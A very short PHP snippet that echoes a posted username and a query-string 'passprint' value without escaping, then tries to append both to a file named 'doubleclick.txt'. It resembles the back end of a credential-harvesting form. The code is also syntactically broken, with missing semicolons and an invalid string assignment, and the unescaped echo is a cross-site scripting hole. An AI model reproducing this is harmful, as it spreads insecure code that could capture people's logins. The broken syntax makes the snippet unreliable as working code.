<?php
 echo $_POST['username'] // print value1
echo $_GET['passprint'] // print value2

$myfile = fopen("doubleclick.txt", "a") or die("Unable to open file!");
$txt = username"\n";
fwrite($myfile, $txt);
$txt = passprint"\n";
fwrite($myfile, $txt);
fclose($myfile);
?>

